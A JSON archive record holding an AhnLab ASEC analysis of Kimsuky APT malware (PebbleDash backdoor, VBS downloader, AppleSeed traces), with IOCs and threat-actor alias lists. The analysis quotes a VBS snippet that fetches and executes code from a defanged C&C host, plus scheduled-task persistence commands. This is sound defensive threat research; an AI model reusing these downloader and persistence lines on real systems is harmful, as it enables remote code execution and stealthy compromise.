{
    "id": "acf1df0a-c2a2-4c63-a3bf-ec2f44fc4797",
    "created_at": "2023-01-12T15:07:10.634842Z",
    "updated_at": "2025-03-27T02:16:55.377722Z",
    "deleted_at": null,
    "sha1_hash": "3e5825f4dd32839e66007895319dd13f51c6137b",
    "title": "2021-12-28 - APT Attack Cases of Kimsuky Group (PebbleDash)",
    "authors": "",
    "file_creation_date": "2022-05-28T23:19:37Z",
    "file_modification_date": "2022-05-28T23:19:37Z",
    "file_size": 2044756,
    "plain_text": "# APT Attack Cases of Kimsuky Group (PebbleDash)\n\n**asec.ahnlab.com/en/30022/**\n\nDecember 28, 2021\n\nThe ASEC analysis team has been keeping an eye on the trend of malware that attempts\nAPT attacks, sharing findings on the blog. In this confirmed case, PebbleDash backdoor\nwas used in the attack, but logs of AppleSeed, Meterpreter, and other additional malware\nstrains were also found.\n\n**PebbleDash Backdoor**\n\nThe attacker sent the following spear phishing email, prompting the user to download and\nrun the compressed file after clicking the link for the attachment.\n\n\n-----\n\nSpear phishing email\n“Construction completion notice.pif” file can be seen when decompressing the compressed\nzip file as shown below. This file is a dropper that drops the PebbleDash backdoor, which\nperforms actual malicious behaviors.\n\nConstruction completion notice.pif dropper\n\nThe dropper drops PebbleDash in the “C:\\ProgramData\\thumbs.db.pif” path and runs it. At\nthe same time, it also drops and runs the “C:\\ProgramData\\construction completion\nnotice.pdf” file to trick the user into thinking that a normal PDF document file has been\nopened.\n\n\n-----\n\nNormal PDF document file that is also created and executed\nPebbleDash is a backdoor that is installed through attachments of spear phishing emails; it\ncan receive commands from the attacker to perform malicious behaviors. The commands it\ncan receive from the C&C server and perform are process and file tasks, downloading and\nuploading files, etc. As such, the attacker can obtain control of the system through\nPebbleDash.\n\nThe current confirmed sample is overall similar to the form that has been found since this\nyear, but there are some differences as well. Unlike previous samples that created the\nsystem32 folder in the execution path and copied the file with the name smss.exe to run\nrecursion, the current one creates the system32 folder but installs the file as lsass.exe.\n\nPebbleDash requires an argument to run, and the strings that were used as the argument in\n2021 were “zWbTLWgKymXMDwZ” and “MskulCxGMCgpGdM”. The current sample requires\n“njXbxuRQyujZeUAGGYaH”.\n\nWhen the malware is executed after having “njXbxuRQyujZeUAGGYaH” as the argument, it\ncopies itself in the same path of \\system32\\lsass.exe (C:\\ProgramData\\system32\\lsass.exe).\nIn this case, “iFfmHUtawXNNxTHEiAAN” and the initial run program path are given as\narguments to be executed while the original file proceeds with self-deletion. As a result, you\ncan check the following process in the infected system.\n\n\n-----\n\nPebbleDash that is executed after installation\n**VBS Malware**\n\nThe PebbleDash sample explained above is just one of the many cases; there were\nadditional malware types found in the system and related systems. The first one is the VBS\nmalware. The Kimsuky group uses the pif dropper that is similar to the dropper mentioned\nabove when installing AppleSeed. The pif dropper that installs PebbleDash only installs the\nmalware after showing a normal document file, but the one that installs AppleSeed installs\nVBS malware as well.\n\nThe malware uses mshta.exe to download VBS from outside and runs it. The additional VBS\nscript that is downloaded and executed through the process steals information and registers\n2 task schedulers. The previous case used the following commands.\n```\n> cmd /c schtasks /Create /SC minute /MO 20 /TN GoogleCache /TR \"wscript //e:vbscript\n//b C:\\ProgramData\\Chrome\\.NetFramework.xml\" /f\n> cmd /c schtasks /Create /SC minute /MO 1 /TN GoogleUpdate /TR \"regsvr32 /s\nC:\\ProgramData\\Chrome\\update.cfg\" /f\n\n```\nThe team could not find the pif dropper for the current case in the infected system, but it had\nthe following task schedulers registered similar to the case mentioned above.\n```\n\"wscript //e:vbscript //b C:\\ProgramData\\Chrome\\.NetFramework.xml\"\n\"regsvr32 /sC:\\ProgramData\\Microsoft\\Windows\\update.cfg\"\n\n```\nThe collected “.NetFramework.xml” file has xml for extension, but it is actually a VBS\nmalware which takes the form of a simple script as shown below. Its sole feature is\ndownloading additional scripts from external source and running them.\n```\nOn Error Resume Next:\nSet rudrbvikmeaaaoja = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\"):\nrudrbvikmeaaaoja.open \"POST\", \"hxxp://m.sharing.p-e[.]kr/index.php?query=me\",\n  False:rudrbvikmeaaaoja.Send:Execute(rudrbvikmeaaaoja.responseText):\n\n```\nAt the time of the analysis, the C&C server had sent a simple command shown below.\nHowever, as the file is registered to the task scheduler and periodically runs commands after\ndownloading them, it can perform additional malicious behaviors if the attacker sends\ndifferent commands.\n```\nSet WShell=CreateObject(\"WScript.Shell\"):retu=WShell.run(\"cmd /c taskkill /im\nmshta.exe /f\", 0,true)\n\n```\n\n-----\n\n**Additional Logs**\n\nUp to this part, the analysis was done mostly on actually confirmed files. Given that the VBS\nmalware is installed by the pif dropper that installs AppleSeed, logs of AppleSeed could also\nbe found on ASD (AhnLab Smart Defense) infrastructure. The malware was installed on a\npath disguised as a normal software path and was executed with the command line shown\nbelow. Having such an install path is one of the typical characteristics of AppleSeed.\n```\nregsvr32.exe /s \"C:\\ProgramData\\Firmware\\ESTsoft\\Common\\ESTCommon.dll\"\n\n```\nThere were also logs for Meterpreter of Metasploit that tends to be installed in the system\ninfected with AppleSeed.\n\nThe above sections of this paper provided a brief explanation of the features the discovered\nmalware types possess.\n\n**[File Detection]**\n\n**File Detection**\nDropper/Win.LightShell (2021.12.16.01)\nBackdoor/Win.PebbleDash.R458675 (2021.12.16.00)\nDownloader/VBS.Agent (2021.12.08.00)\n**Behavior Detection**\nExecution/MDP.Wscript.M3817\n\n**[IOC Info]**\n\n**PebbleDash Dropper MD5**\n269ded557281d38b5966d6227c757e92\n**PebbleDash MD5**\n7211fed2e2ec624c87782926200d61fd\n**VBS Downloader MD5**\n71fe5695bd45b72a8bb864636d92944b\n25f057bff7de9d3bc2fb325697c56334\n**PebbleDash C&C**\nhxxp://tools.macbook.kro[.]kr/update.php\n**VBS Downloader C&C**\nhxxp://m.sharing.p-e[.]kr/index.php?query=me\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n\n-----\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n[Tagged as:AppleSeed,](https://asec.ahnlab.com/tag/appleseed/) [APT,](https://asec.ahnlab.com/en/tag/apt-en/) [Kimsuky,](https://asec.ahnlab.com/en/tag/kimsuky-en/) [PebbleDash](https://asec.ahnlab.com/tag/pebbledash/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-28 - APT Attack Cases of Kimsuky Group (PebbleDash).pdf"
    ],
    "report_names": [
        "2021-12-28 - APT Attack Cases of Kimsuky Group (PebbleDash).pdf"
    ],
    "threat_actors": [
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536030,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1653779977,
    "ts_modification_date": 1653779977,
    "files": {
        "pdf": "https://archive.orkl.eu/3e5825f4dd32839e66007895319dd13f51c6137b.pdf",
        "text": "https://archive.orkl.eu/3e5825f4dd32839e66007895319dd13f51c6137b.txt",
        "img": "https://archive.orkl.eu/3e5825f4dd32839e66007895319dd13f51c6137b.jpg"
    }
}